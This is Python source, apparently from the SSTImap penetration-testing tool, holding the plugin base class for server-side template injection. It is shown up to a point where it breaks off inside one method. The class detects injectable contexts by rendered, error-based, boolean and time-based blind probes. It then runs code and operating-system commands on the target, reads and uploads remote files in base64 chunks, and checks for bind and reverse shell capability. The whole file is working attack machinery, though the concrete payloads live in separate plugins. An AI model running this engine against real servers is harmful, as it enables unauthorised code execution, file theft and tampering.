from utils.strings import chunk_seq, md5
from utils import rand, config
from utils.loggers import log
from core.matcher import match
import re
import itertools
import base64
import collections
import threading
import sys

loaded_plugins = {}
failed_plugins = []


def unload_plugins():
    global loaded_plugins
    global failed_plugins
    for k in loaded_plugins:
        for p in loaded_plugins[k]:
            if p.__module__ in sys.modules:
                del sys.modules[p.__module__]
    loaded_plugins = {}
    for p in failed_plugins:
        if p.__module__ in sys.modules:
            del sys.modules[p.__module__]
    failed_plugins = []


def _recursive_update(d, u):
    # Update value of a nested dictionary of varying depth
    for k, v in u.items():
        if isinstance(d, collections.abc.Mapping):
            if isinstance(v, collections.abc.Mapping):
                r = _recursive_update(d.get(k, {}), v)
                d[k] = r
            else:
                d[k] = u[k]
        else:
            d = {k: u[k]}
    return d


def compatible_url_safe_base64_encode(code):
    code_b64 = code.encode(encoding='UTF-8')
    code_b64 = base64.urlsafe_b64encode(code_b64).decode(encoding='UTF-8')
    return code_b64


def compatible_base64_encode(code):
    code_b64p = code.encode(encoding='UTF-8')
    code_b64p = base64.b64encode(code_b64p).decode(encoding='UTF-8')
    return code_b64p


class Plugin(object):
    generic_plugin = False
    legacy_plugin = False
    extra_plugin = False
    no_tests = False
    priority = 10
    header_type = 'cat'
    header_length = 10
    sstimap_version = config.version
    plugin_info = {
        "Description": """This plugin has no description.""",
        "Usage notes": "",
        "Authors": [],
        "References": [],
        "Engine": [],
    }

    def __init__(self, channel):
        # HTTP channel
        self.channel = channel
        # Plugin name
        self.plugin = self.__class__.__name__
        # Collect the HTTP response time into a deque to be used to
        # tune the average response time for blind values.
        # Estimate 0.5s for a safe start.
        self.render_req_tm = collections.deque([0.5], maxlen=5)
        # The delay fortime-based blind injection. This will be added 
        # to the average response time for render values.
        self.tm_delay = self.channel.args.get('time_based_blind_delay', 4)
        self.tm_verify_delay = self.channel.args.get('time_based_verify_blind_delay', 30)
        self.tm_varied = False
        # Declare object attributes
        self.actions = {}
        self.contexts = []
        # Call user-defined inits
        self.language_init()
        self.init()

    def __init_subclass__(cls, **kwargs):
        module = cls.__module__.split(".")
        if module[0] == "plugins":
            if config.compare_versions(cls.sstimap_version, config.min_version['plugin']) == "<":
                log.log(22, f'''{cls.__name__} plugin is outdated and cannot be loaded''')
                log.log(29, f"{cls.__name__} made for version {cls.sstimap_version}, "
                            f"expected {config.min_version['plugin']} - {config.version}")
                failed_plugins.append(cls)
                return
            if config.compare_versions(cls.sstimap_version, config.version) == ">":
                log.log(22, f'''{cls.__name__} plugin requires SSTImap update and cannot be loaded''')
                log.log(29, f"{cls.__name__} made for version {cls.sstimap_version}, "
                            f"expected {config.min_version['plugin']} - {config.version}")
                failed_plugins.append(cls)
                return
            if module[1] in loaded_plugins:
                loaded_plugins[module[1]].append(cls)
            else:
                loaded_plugins[module[1]] = [cls]

    def language_init(self):
        # To be overridden. This can call self.update_actions
        # and self.set_contexts
        pass

    def init(self):
        # To be overridden. This can call self.update_actions
        # and self.set_contexts
        pass

    def rendered_detected(self):
        call = self.get_call_sequence('render')
        error = self.get('error', False)
        action_evaluate = self.actions.get('evaluate', {}).copy()
        if error and 'evaluate_error' in self.actions:
            action_evaluate.update(self.actions.get('evaluate_error', {}))
        test_os_code = action_evaluate.get('test_os')
        test_os_code_expected = action_evaluate.get('test_os_expected')
        test_eval_code = action_evaluate.get('test_eval')
        test_eval_expected = action_evaluate.get('test_eval_expected')
        if "evaluate" in call:
            self.set('evaluate', self.language)
        # Using rstrip in case of trailing newline
        if not self.get('evaluate') and test_eval_code and test_eval_expected \
                and test_eval_expected == self.evaluate(test_eval_code).rstrip():
            self.set('evaluate', self.language)
            call += self.get_call_sequence('evaluate')
        if test_os_code and test_os_code_expected:
            os = self.evaluate(test_os_code)
            if os and re.search(test_os_code_expected, os):
                self.set('os', os)
                if not self.get('evaluate'):
                    self.set('evaluate', self.language)
                    call += self.get_call_sequence('evaluate')
        action_execute = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action_execute.update(self.actions.get('execute_error', {}))
        test_cmd_code = action_execute.get('test_cmd')
        test_cmd_code_expected = action_execute.get('test_cmd_expected')
        test_cmd_os = action_execute.get('test_os')
        test_cmd_os_expected = action_execute.get('test_os_expected')
        # Using rstrip in case of trailing newline
        if "execute" in call:
            self.set('execute', True)
        if not self.get('execute') and test_cmd_code and test_cmd_code_expected \
                and test_cmd_code_expected == self.execute(test_cmd_code).rstrip():
            self.set('execute', True)
        if test_cmd_os and test_cmd_os_expected and not (self.get('execute') and self.get('os')):
            os = self.execute(test_cmd_os)
            if os and re.search(test_cmd_os_expected, os):
                self.set('os', os)
                if not self.get('execute'):
                    self.set('execute', True)
        if self.check_call_sequence('write'):
            self.set('write', True)
        if self.check_call_sequence('read'):
            self.set('read', True)
        if self.check_call_sequence('bind_shell'):
            self.set('bind_shell', True)
        if self.check_call_sequence('reverse_shell'):
            self.set('reverse_shell', True)

    def blind_detected(self):
        call = self.get_call_sequence('blind')
        test_eval_code = self.actions.get('evaluate', {}).get('test_eval')
        if "evaluate_blind" in call or (test_eval_code and self.evaluate_blind(test_eval_code)):
            self.set('evaluate_blind', self.language)
            call += self.get_call_sequence('evaluate_blind')
        test_cmd_code = self.actions.get('execute', {}).get('test_cmd')
        if "execute_blind" in call or (test_cmd_code and self.execute_blind(test_cmd_code)):
            self.set('execute_blind', True)
        if self.check_call_sequence('write'):
            self.set('write', True)
        if self.check_call_sequence('bind_shell'):
            self.set('bind_shell', True)
        if self.check_call_sequence('reverse_shell'):
            self.set('reverse_shell', True)

    def get_call_sequence(self, action):
        res = [action]
        if action in ["render"]:
            res += ["inject"]
        elif action not in ["inject"]:
            payload = self.actions.get(action, {}).copy()
            action_base = action.split("_")[0]
            if self.get('error', False) and f'{action_base}_error' in self.actions:
                payload.update(self.actions.get(f'{action_base}_error', {}))
            elif self.get('boolean', False) and f'{action_base}_boolean' in self.actions:
                payload.update(self.actions.get(f'{action_base}_boolean', {}))
            elif self.get('blind', False) and f'{action_base}_blind' in self.actions:
                payload.update(self.actions.get(f'{action_base}_blind', {}))
            elif action == 'blind' and self.get('boolean', False) and f'boolean' in self.actions:
                payload.update(self.actions.get(f'boolean', {}))
            default = 'render' if action in ['execute', 'evaluate', 'read', 'md5'] else 'inject'
            call_name = payload.get('call', default)
            res += self.get_call_sequence(call_name)
        return res

    def check_call_sequence(self, action):
        if action == "inject":
            return True
        action_base = action.split("_")[0]
        if action in ["evaluate", "execute", "evaluate_blind", "execute_blind"] and \
                not (self.get(f"{action_base}_blind") or self.get(action_base)):
            return False
        error = self.get('error', False)
        boolean = self.get('boolean', False)
        if not (self.actions.get(action) or (error and self.actions.get(f'{action_base}_error')) or
                (boolean and self.actions.get(f'{action_base}_boolean'))):
            return False
        call = self.get_call_sequence(action)
        if len(call) > 1:
            return self.check_call_sequence(call[1])
        return True

    def detect(self):
        # Get user-provided techniques
        techniques = self.channel.args.get('technique')

        tested = []
        for technique in techniques:
            if self.get('engine'):
                # Engine found, no further testing needed
                break
            if technique in tested:
                # Already tested this technique
                continue
            tested.append(technique)

            # Render technique
            if technique == 'R':
                # Start detection
                self._detect_render()
                # If render is not set, check unreliable render
                if self.get('render') is None:
                    self._detect_unreliable_render()
                # Else, print and execute rendered_detected()
                else:
                    # If here, the rendering is confirmed
                    prefix = self.get('prefix', '')
                    render = self.get('render', '{code}').format(code='*')
                    wrapper = self.get('wrapper', '{code}').format(code=render)
                    suffix = self.get('suffix', '')
                    log.log(24, f'''{self.plugin} plugin has confirmed injection with tag '{repr(prefix).strip("'")}{repr(wrapper).strip("'")}{repr(suffix).strip("'")}' ''')
                    # Clean up any previous unreliable render data
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # Set basic info
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # Set the environment
                    self.rendered_detected()

            # Error-based technique
            # This is just a render technique with a different payload
            elif technique == 'E':
                # Start detection
                self._detect_render(reflection="render_error")
                # If error is not set, check unreliable error message
                if self.get('error') is None:
                    self._detect_unreliable_render(reflection="render_error")
                # Else, print and execute rendered_detected()
                else:
                    # If here, the error reflection is confirmed
                    log.log(24, f'''{self.plugin} plugin has confirmed error-based injection''')
                    # Clean up any previous unreliable error message data
                    self.delete('unreliable_render_error')
                    self.delete('unreliable')
                    # Set basic info
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # Set the environment
                    self.rendered_detected()

            # Time-based blind technique
            elif technique == 'B' and self.channel.boolean_enabled:
                self._detect_blind(variant="boolean")
                if self.get('boolean'):
                    log.log(24, f'{self.plugin} plugin has confirmed boolean error-based blind injection')
                    # Clean up any previous unreliable render data
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # Set basic info
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # Set the environment
                    self.blind_detected()

            # Time-based blind technique
            elif technique == 'T':
                self._detect_blind()
                if self.get('blind'):
                    log.log(24, f'{self.plugin} plugin has confirmed time-based blind injection')
                    # Clean up any previous unreliable render data
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # Set basic info
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # Set the environment
                    self.blind_detected()

    def _generate_contexts(self):
        # Loop all the contexts
        for ctx in self.contexts:
            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[0] is not None and ctx.get('level') != int(force_level[0]):
                continue
            # Skip any context which is above the required level
            if not force_level and ctx.get('level') > self.channel.args.get('level'):
                continue
            # The suffix is fixed
            # If the context has no closures, generate one closure with a zero-length string
            suffix = ctx.get('suffix', '')
            suffix_format = "{closure}" in suffix or "{rclosure}" in suffix
            suffix_text = (suffix.format(closure='', rclosure='') if suffix_format else suffix).replace('\n', '\\n')
            prefix_text = ctx.get('prefix', '').format(closure='').replace('\n', '\\n')
            wrappers = ctx.get('wrappers', ['{code}'])
            if ctx.get('closures'):
                closures = self._generate_closures(ctx)
            else:
                closures = [('', '')]
            if len(closures)*len(wrappers) > 1:
                log.log(26, f'''{self.plugin} plugin is testing {prefix_text}*{suffix_text} code context escape with {len(closures)*len(wrappers)} variations{f' (level {ctx.get("level", 1)})' if self.get('level') else ''}''')
            for wrapper in wrappers:
                for closure, rclosure in closures:
                    # Format the prefix with closure
                    prefix = ctx.get('prefix', '{closure}').format(closure=closure)
                    if suffix_format:
                        suffix = ctx.get('suffix', '').format(closure=closure, rclosure=rclosure)
                    yield prefix, suffix, wrapper

    """
    Detection of unreliable error message or rendering tag with no header and trailer.
    """
    def _detect_unreliable_render(self, reflection="render"):
        render_action = self.actions.get(reflection)
        if not render_action:
            return
        # Print what it's going to be tested
        if reflection == "render":
            log.debug(f'{self.plugin} plugin is testing unreliable rendering on text context')
        elif reflection == "render_error":
            log.debug(f'{self.plugin} plugin is testing unreliable error message')
        # Prepare base operation to be evaluated server-side
        expected = render_action.get('test_render_expected')
        payload = render_action.get('test_render')
        # Probe with payload wrapped by header and trailer, no suffix or prefix.
        # Test if contained, since the page contains other garbage
        if expected in self.render(code=payload, header='', trailer='', header_rand=[0, 0],
                                   trailer_rand=[0, 0], prefix='', suffix='', error=reflection == "render_error"):
            # Print if the first found unreliable render
            if not self.get(f'unreliable_{reflection}'):
                if reflection == "render":
                    log.log(25, f"{self.plugin} plugin has detected unreliable rendering with tag "
                                f"{repr(render_action.get('render').format(code='*'))}, skipping")
                elif reflection == "render_error":
                    log.log(25, f"{self.plugin} plugin has detected unreliable error message, skipping")
            self.set(f'unreliable_{reflection}', render_action.get('render'))
            self.set('unreliable', self.plugin)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_blind(self, variant="blind"):
        action = self.actions.get(variant, {})
        payload_true = action.get('test_bool_true')
        payload_false = action.get('test_bool_false')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if self.no_tests or not (action and payload_true and payload_false and call_name and hasattr(self, call_name)):
            return
        # Print what it's going to be tested
        log.log(23, f'{self.plugin} plugin is testing '
                    f'{"time" if variant=="blind" else "boolean error"}-based blind injection')
        kwarg = {variant: True}
        for prefix, suffix, wrapper in self._generate_contexts():
            # Conduct a true-false test
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                continue
            detail = {f'{variant}_true': self._inject_verbose}
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                continue
            detail[f'{variant}_false'] = self._inject_verbose
            # We can assume here blind is true
            log.log(28, f'{self.plugin} plugin has detected possible '
                        f'{"time" if variant=="blind" else "boolean error"}-based blind injection')
            self.set(f'{variant}_test', True)
            if variant == 'blind':
                detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
            elif variant == 'boolean':
                payload_true = action.get('verify_bool_true')
                payload_false = action.get('verify_bool_false')
            # Conduct a true-false test again with bigger delay
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                self.set(f'{variant}_test', False)
                log.log(25, f'Possible {"time" if variant=="blind" else "boolean error"}'
                            f'-based blind injection turned out to be false positive')
                continue
            detail[f'{variant}_true_verify'] = self._inject_verbose
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                self.set(f'{variant}_test', False)
                log.log(25, f'Possible {"time" if variant=="blind" else "boolean error"}'
                            f'-based blind injection turned out to be false positive')
                continue
            self.set(f'{variant}_test', False)
            detail[f'{variant}_false_verify'] = self._inject_verbose
            if variant == 'blind':
                detail['average_verify'] = sum(self.render_req_tm) / len(self.render_req_tm)
            self.set(variant, True)
            self.set('prefix', prefix)
            self.set('suffix', suffix)
            self.set('wrapper', wrapper)
            self.set('wrapper_type', 'local')  # Should always work as a fallback for blind
            self.channel.detected(variant, detail)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_render(self, reflection="render"):
        render_action = self.actions.get(reflection)
        if self.no_tests or not render_action:
            return
        # Print what it's going to be tested
        if reflection == "render":
            log.log(23, f"{self.plugin} plugin is testing rendering with tag "
                        f"{repr(render_action.get('render').format(code='*' ))}")
        elif reflection == "render_error":
            log.log(23, f'{self.plugin} plugin is testing error-based injection')
        for prefix, suffix, wrapper in self._generate_contexts():
            # Prepare base operation to be evaluated server-side
            expected = render_action.get('test_render_expected')
            payload = render_action.get('test_render')
            wrapper_type = render_action.get(f'wrapper_type', 'local')
            header_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
            header = render_action.get('header')  # .format(header=header_rand)
            trailer_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
            trailer = render_action.get('trailer')  # .format(trailer=trailer_rand)
            # First probe with payload wrapped by header and trailer, no suffix or prefix
            if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                       trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper,
                                       wrapper_type=wrapper_type, error=reflection == "render_error"):
                self.set('render', render_action.get('render'))
                self.set('error', reflection == "render_error")
                self.set('header', render_action.get('header'))
                self.set('trailer', render_action.get('trailer'))
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('wrapper', wrapper)
                self.set('wrapper_type', wrapper_type)
                self.channel.detected(reflection, {'expected': expected})
                return

    """
    Raw inject of the payload.
    """
    def inject(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        injection = prefix + wrapper.format(code=code) + suffix
        log.debug(f'[request {self.plugin}] {repr(self.channel.url)}')
        # If the request is blind
        if blind:
            expected_delay = self._get_expected_delay()
            text, delta, vector = self.channel.req(injection)
            result = delta >= expected_delay
            log.debug(f'[blind {self.plugin}] request took {delta}. '
                      f'{expected_delay} is the threshold, returning {result}')
            self._inject_verbose = {'result': result, 'payload': injection, 'expected_delay': expected_delay}
            return result
        elif boolean:
            text, delta, vector = self.channel.req(injection)
            if self.channel.args.get("boolean_regex_ok"):
                try:
                    pattern = re.compile(self.channel.args.get('boolean_regex_ok'))
                except:
                    log.log(22, f'Invalid RE: "{self.channel.args.get("boolean_regex_ok")}"')
                    return
                result = not not pattern.search(text)
                log.debug(f'[boolean {self.plugin}] request checked against RE: '
                          f'{self.channel.args.get("boolean_regex_err")} (OK), returning {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'regex_type': "Normal",
                                        'regex': self.channel.args.get('boolean_regex_ok')}
            elif self.channel.args.get("boolean_regex_err"):
                try:
                    pattern = re.compile(self.channel.args.get('boolean_regex_err'))
                except:
                    log.log(22, f'Invalid RE: "{self.channel.args.get("boolean_regex_err")}"')
                    return
                result = not pattern.search(text)
                log.debug(f'[boolean {self.plugin}] request checked against RE: '
                          f'{self.channel.args.get("boolean_regex_err")} (ERR), returning {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'regex_type': "Error",
                                        'regex': self.channel.args.get('boolean_regex_err')}
            else:
                result = match(self.channel, vector)
                log.debug(f'[boolean {self.plugin}] request returned {vector}. '
                          f'{self.channel.page_vector} is expected, returning {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'vector': vector,
                                        'expected': self.channel.page_vector, 'profile': self.channel.page_profile}
            return result
        else:
            text, delta, vector = self.channel.req(injection)
            # Append the execution time to a buffer
            self.render_req_tm.append(delta)
            return text.strip() if text else text

    """
    Inject the rendered payload and get the result.
    
    The request is composed by parameters from:
    
        - Already rendered passed **kwargs, or
        - self.get() to be rendered, or
        - self.actions.get() to be rendered
        
    """
    def render(self, code, **kwargs):
        error = kwargs.get('error', self.get('error', False))
        call_name = 'render_error' if error else 'render'
        # If header == '', do not send headers
        header_template = kwargs.get('header')
        header_type = self.header_type
        if header_template != '':
            header_template = kwargs.get('header', self.get('header'))
            if not header_template:
                header_template = self.actions.get(call_name, {}).get('header')
            if header_template:
                header_rand = kwargs.get('header_rand', self.get('header_rand', [rand.randint_n(self.header_length,4),
                                                                                 rand.randint_n(self.header_length,4)]))
                header = header_template.format(header=header_rand)
        else:
            header_rand = [0, 0]
            header = ''
        # If trailer == '', do not send headers
        trailer_template = kwargs.get('trailer')
        if trailer_template != '':
            trailer_template = kwargs.get('trailer', self.get('trailer'))
            if not trailer_template:
                trailer_template = self.actions.get(call_name, {}).get('trailer')
            if trailer_template:
                trailer_rand = kwargs.get('trailer_rand', self.get('trailer_rand', [rand.randint_n(self.header_length,4),
                                                                                    rand.randint_n(self.header_length,4)]))
                trailer = trailer_template.format(trailer=trailer_rand)
        else:
            trailer_rand = [0, 0]
            trailer = ''
        # Ensure constant length
        payload_template = kwargs.get('render', self.get('render'))
        if not payload_template:
            payload_template = self.actions.get(call_name, {}).get('render')
        if not payload_template:
            # Exiting, actions.render(_error).render is not set
            return
        payload = payload_template.format(code=code)
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        wrapper_type = kwargs.get('wrapper_type', self.get('wrapper_type', 'local'))
        blind = kwargs.get('blind', False)
        boolean = kwargs.get('boolean', False)
        if wrapper_type == "local":
            injection = wrapper.format(code=header) + wrapper.format(code=payload) + wrapper.format(code=trailer)
        elif wrapper_type == "global":
            injection = wrapper.format(code=header+payload+trailer)
        else:  # Fallback if wrapper type is unknown
            injection = header + payload + trailer
        if header_type == "add":
            header_expected = str(sum(header_rand))
            trailer_expected = str(sum(trailer_rand))
        elif header_type == "cat":
            header_expected = "".join([str(x) for x in header_rand])
            trailer_expected = "".join([str(x) for x in trailer_rand])
        else:
            header_expected = ""
            trailer_expected = ""
        # Save the average HTTP request time of rendering in order
        # to better tone the blind request timeouts.
        # Reset wrapper to empty, as it was already applied
        result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix,
                                 blind=blind, boolean=boolean, wrapper="{code}")
        if blind or boolean:
            return result_raw
        else:
            result = ''
            # Return result_raw if header and trailer are not specified
            if not header and not trailer:
                return result_raw
            # Cut the result using the header and trailer if specified
            if header:
                before, _, result_after = result_raw.partition(header_expected)
            if trailer and result_after:
                result, _, after = result_after.partition(trailer_expected)
            exfiltrate = self.actions.get(call_name, {}).get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except:
                    pass
            return result.strip() if result else result

    def set(self, key, value):
        self.channel.data[key] = value

    def get(self, key, default=None):
        return self.channel.data.get(key, default)
        
    def delete(self, key):
        if key in self.channel.data:
            del self.channel.data[key]

    def _generate_closures(self, ctx):
        closures_dict = ctx.get('closures', {'0': []})
        closures = []
        # Loop all the closure names
        for ctx_closure_level, ctx_closure_matrix in closures_dict.items():
            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[1] and ctx_closure_level != int(force_level[1]):
                continue
            # Skip any closure list which is above the required level
            if not force_level and ctx_closure_level > self.channel.args.get('level'):
                continue
            closures += [(''.join([y[0] for y in x]), ''.join([y[1] for y in x][::-1]))
                         for x in itertools.product(*ctx_closure_matrix)]
        closures = sorted(set(closures), key=lambda x: len(x[0]+x[1]))
        # Return it
        return closures

    """ Overridable function to get MD5 hash of remote files. """
    def md5(self, remote_path):
        error = self.get('error', False)
        action = self.actions.get('md5', {}).copy()
        if error and 'md5_error' in self.actions:
            action.update(self.actions.get('md5_error', {}))
        payload = action.get('md5')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        execution_code = payload.format(path=remote_path)
        result = getattr(self, call_name)(code=execution_code)
        exfiltrate = action.get('exfiltrate', 'plain')
        if exfiltrate == 'base64':
            try:
                result = base64.b64decode(result).decode()
            except:
                pass
        # Check md5 result format
        if re.match(r"([a-fA-F\d]{32})", result):
            return result
        else:
            return None

    """ Overridable function to detect read capabilities. """
    def detect_read(self):
        # Assume read capabilities only if evaluation
        # has been already detected and if self.actions['read'] exits
        if not self.get('evaluate') or not self.actions.get('read'):
            return
        self.set('read', True)

    """ Overridable function to read remote files. """
    def read(self, remote_path):
        error = self.get('error', False)
        action = self.actions.get('md5', {}).copy()
        if error and 'read_error' in self.actions:
            action.update(self.actions.get('read_error', {}))
        payload = action.get('read')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        # Get remote file md5
        md5_remote = self.md5(remote_path)
        if not md5_remote:
            log.log(25, 'Error getting remote file md5, check presence and permission')
            return
        execution_code = payload.format(path=remote_path)
        data_b64encoded = getattr(self, call_name)(code=execution_code)
        data = base64.b64decode(data_b64encoded)
        if not md5(data) == md5_remote:
            log.log(25, 'Remote file md5 mismatch, check manually')
        else:
            log.log(21, 'File downloaded correctly')
        return data

    def write(self, data, remote_path):
        action = self.actions.get('write', {})
        payload_write = action.get('write')
        payload_truncate = action.get('truncate')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_write or not payload_truncate or not call_name or not hasattr(self, call_name):
            return
        # Check existence and overwrite with --force-overwrite
        if self.get('blind') or self.get('boolean') or self.md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                if self.get('blind') or self.get('boolean'):
                    log.log(25, 'Blind upload might overwrite files, run with --force-overwrite to continue')
                else:
                    log.log(25, 'Remote file already exists, run with --force-overwrite to overwrite')
                return
            else:
                execution_code = payload_truncate.format(path=remote_path)
                getattr(self, call_name)(code=execution_code)
        # Upload file in chunks of 500 characters
        for chunk in chunk_seq(data, 500):
            log.debug(f'[b64 encoding] {chunk}')
            chunk_b64 = base64.urlsafe_b64encode(chunk)
            chunk_b64p = base64.b64encode(chunk)
            lens = {
                'path': len(remote_path),
                'clen': len(chunk),
                'clen64': len(chunk_b64),
                'clen64p': len(chunk_b64p)
            }
            execution_code = payload_write.format(path=remote_path, chunk_b64=chunk_b64, chunk_b64p=chunk_b64p, lens=lens)
            getattr(self, call_name)(code=execution_code)
        if self.get('blind') or self.get('boolean'):
            log.log(25, 'Blind upload can\'t check the upload correctness, check manually')
        elif not md5(data) == self.md5(remote_path):
            log.log(25, 'Remote file md5 mismatch, check manually')
        else:
            log.log(21, 'File uploaded correctly')

    def evaluate(self, code,  **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        error = kwargs.get('error', self.get('error', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('evaluate', {}).copy()
        if error and 'evaluate_error' in self.actions:
            action.update(self.actions.get('evaluate_error', {}))
        payload = action.get('evaluate')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        if '{code_b64}' in payload:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p)
        }
        execution_code = payload.format(code_b64=code_b64, code=code, code_b64p=code_b64p, lens=lens)
        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                          wrapper=wrapper, blind=blind, boolean=boolean)
        if type(result) == str:
            exfiltrate = action.get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except:
                    pass
        return result

    def execute(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', False)
        error = kwargs.get('error', self.get('error', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action.update(self.actions.get('execute_error', {}))
        #if boolean and 'execute_boolean' in self.actions:
        #    action.update(self.actions.get('execute_boolean', {}))
        payload = action.get('execute')
        call_name = action.get('call', 'render')
        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        if '{code_b64}' in payload:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p)
        }
        execution_code = payload.format(code_b64=code_b64, code_b64p=code_b64p, code=code, lens=lens)
        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                          wrapper=wrapper, blind=blind, boolean=boolean)
        if type(result) == str:
            result = result.replace('\\n', '\n').replace('<br>', '\n')
            exfiltrate = action.get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except:
                    pass
        return result

    def evaluate_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('evaluate_blind', {})
        if boolean and 'evaluate_boolean' in self.actions:
            action.update(self.actions.get('evaluate_boolean', {}))
        payload_action = action.get('evaluate_blind')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        expected_delay = self._get_expected_delay()
        if '{code_b64}' in payload_action:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload_action:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p),
            'delay': len(str(expected_delay))
        }
        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                               code_b64p=code_b64p, code=code, delay=expected_delay)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                        wrapper=wrapper, blind=blind, boolean=boolean)

    def execute_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', '{code}'))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('execute_blind', {})
        if boolean and 'execute_boolean' in self.actions:
            action.update(self.actions.get('execute_boolean', {}))
        payload_action = action.get('execute_blind')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not payload_action or not call_name or not hasattr(self, call_name):
            return
        expected_delay = self._get_expected_delay()
        if '{code_b64}' in payload_action:
            log.debug(f'[b64u encoding] {code}')
        if '{code_b64p}' in payload_action:
            log.debug(f'[b64 encoding] {code}')
        code_b64 = compatible_url_safe_base64_encode(code)
        code_b64p = compatible_base64_encode(code)
        lens = {
            'clen': len(code),
            'clen64': len(code_b64),
            'clen64p': len(code_b64p),
            'delay': len(str(expected_delay))
        }
        execution_code = payload_action.format(code_b64=code_b64, lens=lens,
                                               code_b64p=code_b64p, code=code, delay=expected_delay)
        return getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                        wrapper=wrapper, blind=blind, boolean=boolean)

    def _get_expected_delay(self):
